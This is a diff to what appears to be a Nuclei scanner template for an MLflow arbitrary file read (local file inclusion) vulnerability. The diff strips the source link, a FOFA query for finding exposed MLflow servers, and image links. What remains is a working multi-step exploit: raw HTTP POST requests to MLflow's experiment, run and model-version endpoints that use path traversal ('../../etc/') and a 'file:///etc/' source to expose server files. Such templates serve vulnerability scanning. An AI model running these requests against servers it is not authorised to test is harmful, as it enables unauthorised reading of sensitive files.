@@ -3,12 +3,8 @@ info:
   name: Mlflow create 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dr2uz9ezcxwrp0ps'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: dr2uz9ezcxwrp0ps
-    fofa: app="MLflow"
 http:
 - raw:
   - 'POST /ajax-api/2.0/mlflow/experiments/create HTTP/1.1
@@ -32,14 +28,14 @@ http:
     Content-Length: 110
 
 
-    {"name": "jMTOLYHwzZIVFDCoX", "artifact_location": "http:///#/../../../../../../../../../../../../../../etc/"}![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1731988415952-5547ffe9-67f8-438e-83c8-6d3e9ebcad66.png)'
+    {"name": "jMTOLYHwzZIVFDCoX", "artifact_location": "http:///#/../../../../../../../../../../../../../../etc/"}'
   redirects: false
   matchers:
   - status:
     - 200
     type: status
 - raw:
-  - "POST /api/2.0/mlflow/runs/create HTTP/1.1\nHost: {{Hostname}}\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/json\nConnection: close\nContent-Length: 31\n\n\n{\n  \"experiment_id\": \"34\"\n}\n![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1731988416165-d8237772-fe7a-4659-88b7-10127ab904d6.png)"
+  - "POST /api/2.0/mlflow/runs/create HTTP/1.1\nHost: {{Hostname}}\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/json\nConnection: close\nContent-Length: 31\n\n{\n  \"experiment_id\": \"34\"\n}"
   redirects: false
   matchers:
   - status:
@@ -67,9 +63,7 @@ http:
     Content-Length: 29
 
 
-    {"name": "jMTOLYHwzZIVFDCoX"}
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1731988416463-45fde763-5464-46f5-836e-963aa76dd297.png)'
+    {"name": "jMTOLYHwzZIVFDCoX"}'
   redirects: false
   matchers:
   - status:
@@ -97,9 +91,7 @@ http:
     Content-Length: 101
 
 
-    {"name": "jMTOLYHwzZIVFDCoX", "run_id": "7cf272542e414ccc80549e8f917b81ca", "source": "file:///etc/"}
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1731988416704-a7ad0ed5-753b-4f83-a5b4-480c0618db1b.png)'
+    {"name": "jMTOLYHwzZIVFDCoX", "run_id": "7cf272542e414ccc80549e8f917b81ca", "source": "file:///etc/"}'
   redirects: false
   matchers:
   - status:
